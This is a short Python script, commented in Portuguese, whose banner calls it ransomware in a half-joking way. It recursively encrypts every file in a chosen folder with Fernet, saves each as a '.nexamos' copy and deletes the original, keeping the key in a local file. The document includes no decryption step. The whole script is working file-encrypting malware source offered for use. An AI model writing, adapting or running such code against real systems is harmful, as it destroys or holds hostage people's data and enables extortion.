import os
import argparse
from cryptography.fernet import Fernet

BANNER = r"""
  ________________
 /.,------------,.\
///  .=^^^^^^^\__|\\
\\\   `------.   .//
 `\\`--...._  `;//'
   `\\.-,___;.//'
     `\\-..-//'
       `\\//'

Apenas um rans.... shh silêncio.
"""

def gerar_chave():
    chave = Fernet.generate_key()
    with open("key.key", "wb") as f:
        f.write(chave)
    return chave

def carregar_chave():
    return open("key.key", "rb").read()

def criptografar_arquivo(caminho, fernet):
    with open(caminho, "rb") as f:
        dados = f.read()

    dados_cript = fernet.encrypt(dados)

    novo_arquivo = caminho + ".nexamos"
    with open(novo_arquivo, "wb") as f:
        f.write(dados_cript)

    os.remove(caminho)
    print(f"[+] ENCRYPTED -> {novo_arquivo}")

def main():
    print(BANNER)

    parser = argparse.ArgumentParser(description="Underground Crypt")
    parser.add_argument("--pasta", required=True, help="Caminho da pasta para criptografar")
    args = parser.parse_args()

    pasta = args.pasta

    if not os.path.isdir(pasta):
        print("[-] Pasta inválida, irmão.")
        return

    # 🔑 lógica correta da chave
    if not os.path.exists("key.key"):
        chave = gerar_chave()
        print("[*] Key gerada: key.key (guarda isso como se fosse tua alma)")
    else:
        chave = carregar_chave()
        print("[*] Key carregada.")

    fernet = Fernet(chave)

    for raiz, _, arquivos in os.walk(pasta):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if not caminho.endswith(".nexamos"):
                criptografar_arquivo(caminho, fernet)

    print("\n[✓] Operação finalizada.")

if __name__ == "__main__":
    main()
